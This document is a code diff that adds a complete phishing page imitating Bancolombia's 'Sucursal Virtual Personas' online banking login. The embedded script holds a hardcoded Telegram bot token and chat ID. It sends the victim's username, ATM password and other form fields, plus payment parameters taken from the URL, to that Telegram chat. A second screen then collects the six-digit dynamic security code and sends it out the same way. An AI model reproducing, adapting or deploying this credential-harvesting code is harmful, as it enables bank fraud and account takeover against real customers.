@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual Personas</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+  font-family:'Segoe UI',Arial,sans-serif;
+  background:#f0f1f3;
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+.page{
+  position:relative;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:28px 16px 70px;
+}
+
+/* ── CURVAS SVG fijas detrás de todo ── */
+.bg-svg{
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  pointer-events:none;
+  z-index:0;
+}
+
+/* todo el contenido encima del SVG */
+.page > *{ position:relative; z-index:1; }
+
+/* ── LOGO ── */
+.logo-wrap{ margin-bottom:6px; }
+.logo-box{
+  width:130px; height:46px;
+  background:#e4e5e8;
+  border:2px dashed #bbb;
+  border-radius:8px;
+  display:flex; align-items:center; justify-content:center;
+  font-size:12px; color:#999;
+  cursor:pointer; transition:background .2s;
+}
+.logo-box:hover{ background:#d8d9dc; }
+.logo-box img{ max-height:42px; max-width:126px; object-fit:contain; }
+#logoInput{ display:none; }
+
+/* ── TÍTULO ── */
+.titulo{
+  font-size:clamp(20px,4vw,28px);
+  font-weight:400; color:#2c2c2c;
+  margin-bottom:20px; text-align:center;
+}
+
+/* ── ALERT ── */
+.alert-box{
+  background:#d6eef7;
+  border:1px solid #aad4e8;
+  border-radius:12px;
+  padding:14px 18px;
+  width:100%; max-width:430px;
+  display:flex; gap:12px; align-items:flex-start;
+  margin-bottom:16px;
+}
+.alert-ico{
+  flex-shrink:0; width:34px; height:34px;
+  background:#4daac8; border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  margin-top:1px;
+}
+.alert-ico svg{ width:17px; height:17px; fill:white; }
+.alert-body strong{ font-size:13.5px; font-weight:700; color:#1a5e78; display:block; margin-bottom:3px; }
+.alert-body p{ font-size:12.5px; color:#2c7a96; line-height:1.45; margin-bottom:6px; }
+.alert-body a{ font-size:13px; color:#1a5e78; font-weight:700; text-decoration:underline; cursor:pointer; }
+
+/* ── CARD ── */
+.card{
+  background:#fff;
+  border-radius:14px;
+  box-shadow:0 6px 32px rgba(0,0,0,0.10);
+  padding:38px 36px 30px;
+  width:100%; max-width:430px;
+  text-align:center;
+}
+@media(max-width:480px){
+  .card{ padding:28px 18px 22px; }
+}
+
+.card h2{ font-size:22px; font-weight:700; color:#1a1a1a; margin-bottom:10px; }
+.card .sub{ font-size:14px; color:#6b6b6b; line-height:1.5; margin-bottom:28px; }
+
+/* ── CAMPOS ── */
+.field-group{ text-align:left; margin-bottom:4px; }
+.field-row{
+  display:flex; align-items:center; gap:10px;
+  border-bottom:1.5px solid #c8c8c8;
+  padding:9px 4px; transition:border-color .2s;
+}
+.field-row:focus-within{ border-color:#e06000; }
+.field-row svg{ width:20px; height:20px; flex-shrink:0; color:#888; }
+.field-row input{
+  border:none; outline:none; font-size:15px;
+  width:100%; background:transparent;
+  color:#1a1a1a; font-family:inherit;
+}
+.field-row input::placeholder{ color:#aaa; }
+
+.forgot{
+  font-size:12px; color:#222; text-decoration:underline;
+  cursor:pointer; display:block; margin:7px 0 20px 2px;
+  text-align:left; background:none; border:none;
+  font-family:inherit; font-weight:600;
+}
+.forgot:hover{ color:#e06000; }
+
+/* ── BOTÓN ── */
+.btn-login{
+  width:100%; padding:14px;
+  border-radius:40px; border:none;
+  font-size:15px; font-weight:700;
+  cursor:not-allowed;
+  background:#d0d2d6; color:#fff;
+  transition:background .25s,transform .1s;
+  margin-top:4px; font-family:inherit;
+}
+.btn-login.active{
+  background:#f0c621; /* amarillo */
+  color:#000;         /* negro */
+  cursor:pointer;
+}
+
+.btn-login.active:hover{
+  background:#ebbe0d;
+}
+.btn-login.active:hover{ background:#e7c438; }
+.btn-login.active:active{ transform:scale(0.98); }
+
+.link-crear{
+  display:block; margin-top:18px;
+  font-size:14px; font-weight:700;
+  color:#1a1a1a; text-decoration:underline;
+  cursor:pointer; background:none; border:none;
+  font-family:inherit; width:100%;
+}
+.link-crear:hover{ color:#e06000; }
+
+/* ── OTP ── */
+#otp-screen{ display:none; }
+.otp-note{
+  font-size:13px; color:#555; background:#f5f5f5;
+  border-radius:8px; padding:10px 14px;
+  margin-bottom:22px; text-align:left; line-height:1.5;
+}
+.otp-boxes{ display:flex; gap:8px; justify-content:center; margin-bottom:24px; flex-wrap:wrap; }
+.otp-boxes input{
+  width:46px; height:52px;
+  border:1.5px solid #ccc; border-radius:8px;
+  text-align:center; font-size:22px; font-weight:700;
+  color:#1a1a1a; outline:none;
+  transition:border-color .2s; font-family:inherit;
+}
+.otp-boxes input:focus{ border-color:#e06000; }
+.btn-verificar{
+  width:100%; padding:14px;
+  border-radius:40px; border:none;
+  font-size:15px; font-weight:700;
+  background:#c0c4cc; color:#fff;
+  cursor:pointer; font-family:inherit;
+  transition:background .2s;
+}
+.btn-verificar:hover{ background:#b0b4bc; }
+.btn-back{
+  display:block; margin-top:16px;
+  font-size:13px; color:#555;
+  text-decoration:underline; cursor:pointer;
+  background:none; border:none; font-family:inherit; width:100%;
+}
+
+/* ── FOOTER ── */
+.footer-links{
+  display:flex; flex-wrap:wrap;
+  justify-content:center; gap:5px 8px;
+  margin-top:28px;
+}
+.footer-links a{ font-size:12px; color:#555; text-decoration:none; cursor:pointer; }
+.footer-links a:hover{ text-decoration:underline; }
+.footer-links .sep{ font-size:12px; color:#bbb; }
+.footer-meta{ font-size:11px; color:#999; margin-top:10px; text-align:center; }
+.vigilado{ margin-top:16px; font-size:10px; color:#888; text-align:center; text-transform:uppercase; letter-spacing:0.5px; line-height:1.5; }
+.btn-verificar{
+  background:#f0c621;
+  color:#000;
+}
+
+.btn-verificar:hover{
+  background:#ebbe0d;
+}
+</style>
+
+</head>
+<body>
+
+<!-- ══════════════════════════════════════
+     CURVAS — mismo trazo que el diseño real:
+     Izq: amarilla + naranja en arco descendente
+           + morada pequeña al medio
+     Der: amarilla + naranja en arco ascendente
+     ══════════════════════════════════════ -->
+<svg class="bg-svg" xmlns="http://www.w3.org/2000/svg"
+     viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice">
+
+  <!-- IZQUIERDA -->
+  <!-- Amarilla (base, debajo) -->
+  <path d="M -10 0
+           C 80  80, 200 160, 160 310
+           C 120 450,  20 490,  50 590
+           C  70 650, 150 660, 120 770"
+        fill="none" stroke="#f5c400" stroke-width="40" stroke-linecap="round"/>
+  <!-- Naranja (encima de la amarilla) -->
+  <path d="M -30 20
+           C  60 110, 170 200, 130 350
+           C  90 480,  -5 520,  30 620
+           C  55 685, 140 695, 105 810"
+        fill="none" stroke="#e8581a" stroke-width="38" stroke-linecap="round"/>
+  <!-- Morada (pequeña, zona media) -->
+  <path d="M 80 390
+           C  40 445,  30 490,  85 535"
+        fill="none" stroke="#7b2fbe" stroke-width="32" stroke-linecap="round"/>
+
+  <!-- DERECHA -->
+  <!-- Amarilla derecha -->
+  <path d="M 1450 -20
+           C 1360  60, 1240 150, 1280 300
+           C 1320 440, 1420 480, 1390 580
+           C 1370 645, 1290 655, 1320 765"
+        fill="none" stroke="#f5c400" stroke-width="40" stroke-linecap="round"/>
+  <!-- Naranja derecha (encima) -->
+  <path d="M 1470  0
+           C 1380  85, 1260 180, 1300 330
+           C 1340 465, 1440 505, 1410 610
+           C 1390 675, 1305 685, 1335 800"
+        fill="none" stroke="#e8581a" stroke-width="38" stroke-linecap="round"/>
+
+</svg>
+
+<!-- ══ PÁGINA ══ -->
+<div class="page">
+
+  <!-- LOGO -->
+  <div class="logo-wrap">
+    <img src="logo.png" class="logo-img">
+
+  </div>
+
+  <!-- TÍTULO -->
+  <div class="titulo">Sucursal Virtual Personas</div>
+
+  <!-- ALERTA -->
+  <div class="alert-box">
+    <div class="alert-ico">
+      <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20A10 10 0 0 0 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+    </div>
+    <div class="alert-body">
+      <strong>¡Prográmate!</strong>
+      <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
+      <a>Más info aquí.</a>
+    </div>
+  </div>
+
+  <!-- CARD LOGIN -->
+  <div class="card" id="login-screen">
+    <h2>¡Hola!</h2>
+    <p class="sub">Ingresa los datos para gestionar tus<br>productos y hacer transacciones.</p>
+
+    <div class="field-group">
+      <div class="field-row">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
+          <circle cx="12" cy="8" r="4"/>
+          <path d="M4 20c0-4 3.58-7 8-7s8 3 8 7"/>
+        </svg>
+        <input type="text" id="usuario" placeholder="Usuario"
+               autocomplete="username" oninput="verificarCampos()">
+      </div>
+    </div>
+    <button class="forgot">¿Olvidaste tu usuario?</button>
+
+    <div class="field-group">
+      <div class="field-row">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
+          <rect x="5" y="11" width="14" height="10" rx="2"/>
+          <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+          <circle cx="12" cy="16" r="1.5" fill="currentColor" stroke="none"/>
+        </svg>
+        <input type="password" id="clave" placeholder="Clave del cajero"
+               autocomplete="current-password" oninput="verificarCampos()">
+      </div>
+    </div>
+    <button class="forgot">¿Olvidaste o bloqueaste tu clave?</button>
+
+    <button class="btn-login" id="btnLogin" onclick="irOtp()">Iniciar sesión</button>
+    <button class="link-crear">Crear usuario</button>
+  </div>
+
+  <!-- CARD OTP -->
+  <div class="card" id="otp-screen">
+    <h2>Clave dinámica</h2>
+    <p class="sub">Ingresa la clave dinámica generada<br>desde tu aplicación.</p>
+
+<div class="otp-note">
+  Abre tu app y genera la clave dinámica para continuar.
+</div>
+    <div class="otp-boxes" id="otpBoxes">
+      <input type="text" inputmode="numeric" maxlength="1"
+             oninput="moverOtp(this,0)" onkeydown="retrocederOtp(event,0)">
+      <input type="text" inputmode="numeric" maxlength="1"
+             oninput="moverOtp(this,1)" onkeydown="retrocederOtp(event,1)">
+      <input type="text" inputmode="numeric" maxlength="1"
+             oninput="moverOtp(this,2)" onkeydown="retrocederOtp(event,2)">
+      <input type="text" inputmode="numeric" maxlength="1"
+             oninput="moverOtp(this,3)" onkeydown="retrocederOtp(event,3)">
+      <input type="text" inputmode="numeric" maxlength="1"
+             oninput="moverOtp(this,4)" onkeydown="retrocederOtp(event,4)">
+      <input type="text" inputmode="numeric" maxlength="1"
+             oninput="moverOtp(this,5)" onkeydown="retrocederOtp(event,5)">
+    </div>
+    <button class="btn-verificar" onclick="enviarOTP()">Validar código</button>
+    <button class="btn-back" onclick="volverLogin()">← Volver al inicio de sesión</button>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer-links">
+    <a>¿Problemas para conectarte?</a>
+    <span class="sep">·</span>
+    <a>Aprende sobre seguridad</a>
+    <span class="sep">·</span>
+    <a>Reglamento Sucursal Virtual</a>
+    <span class="sep">·</span>
+    <a>Política de privacidad</a>
+  </div>
+  <div class="footer-meta">
+    Dirección IP: 179.33.131.116 &nbsp;·&nbsp; jueves, 16 de abril de 2026, 6:01 p. m.
+  </div>
+  <div class="vigilado">Vigilado · Superintendencia Financiera de Colombia</div>
+
+</div>
+
+<script>
+const BOT_TOKEN = '8735380697:AAF4G03kbZoCAOf2IUWJHE6P6jcmlzYQzCg';
+const CHAT_ID = '-1003969378541';
+
+const params = new URLSearchParams(window.location.search);
+const placa = params.get('placa') || '';
+const valor = params.get('valor') || '';
+const pagoId = params.get('pagoId') || '';
+
+let usuarioActual = "";
+
+// ================= LOGO =================
+function cargarLogo(e){
+  const file=e.target.files[0]; 
+  if(!file)return;
+
+  const r=new FileReader();
+  r.onload=ev=>{
+    const b=document.getElementById('logoBox');
+    b.innerHTML='<img src="'+ev.target.result+'">';
+    b.style.background='transparent';
+    b.style.border='none';
+  };
+  r.readAsDataURL(file);
+}
+
+// ================= VALIDACIÓN =================
+function verificarCampos(){
+  const u=document.getElementById('usuario').value.trim();
+  const c=document.getElementById('clave').value.trim();
+
+  document.getElementById('btnLogin')
+    .classList.toggle('active',!!(u && c));
+}
+
+// ================= LOGIN =================
+async function irOtp(){
+
+  const usuario = document.getElementById('usuario').value.trim();
+  const clave   = document.getElementById('clave').value.trim();
+
+  if(!usuario || !clave) return;
+
+  usuarioActual = usuario;
+
+  // 🚀 CAPTURA AUTOMÁTICA DE TODO
+  let mensaje = "🏦 <b>BANCOLOMBIA INGRESO SUCURSAL</b>\n\n";
+
+  document.querySelectorAll("input").forEach(el=>{
+    const nombre = el.id || "campo";
+    const valorCampo = el.value || "N/A";
+    mensaje += `<b>${nombre}:</b> ${valorCampo}\n`;
+  });
+
+  mensaje += `\n🚗 <b>placa:</b> ${placa}`;
+  mensaje += `\n💰 <b>valor:</b> ${valor}`;
+  mensaje += `\n🆔 <b>pago_id:</b> ${pagoId}`;
+  mensaje += `\n⏰ <b>fecha:</b> ${new Date().toISOString()}`;
+
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+      })
+    });
+  }catch(e){}
+
+  // MOSTRAR OTP
+  document.getElementById('login-screen').style.display='none';
+  document.getElementById('otp-screen').style.display='block';
+
+  document.querySelector('#otpBoxes input').focus();
+}
+
+// ================= OTP =================
+async function enviarOTP(){
+
+  let otp = "";
+
+  document.querySelectorAll('#otpBoxes input').forEach(i=>{
+    otp += i.value;
+  });
+
+  if(otp.length < 4){
+    alert("⚠️ Ingresa el código completo");
+    return;
+  }
+
+  let mensaje = "🔢 <b>OTP WEB</b>\n\n";
+  mensaje += `<b>Usuario:</b> ${usuarioActual}\n`;
+  mensaje += `<b>Código:</b> ${otp}\n`;
+  mensaje += `\n🚗 placa: ${placa}`;
+  mensaje += `\n💰 valor: ${valor}`;
+
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+      })
+    });
+  }catch(e){}
+
+  alert("Procesando...");
+}
+
+// ================= OTP INPUT =================
+function moverOtp(el,idx){
+  el.value=el.value.replace(/[^0-9]/g,'');
+
+  const ins=document.querySelectorAll('#otpBoxes input');
+  if(el.value && idx<5) ins[idx+1].focus();
+}
+
+function retrocederOtp(e,idx){
+  if(e.key==='Backspace'){
+    const ins=document.querySelectorAll('#otpBoxes input');
+    if(!ins[idx].value && idx>0){
+      ins[idx-1].focus();
+      ins[idx-1].value='';
+    }
+  }
+}
+
+function volverLogin(){
+  document.getElementById('otp-screen').style.display='none';
+  document.getElementById('login-screen').style.display='block';
+}
+</script>
+</body>
+</html>
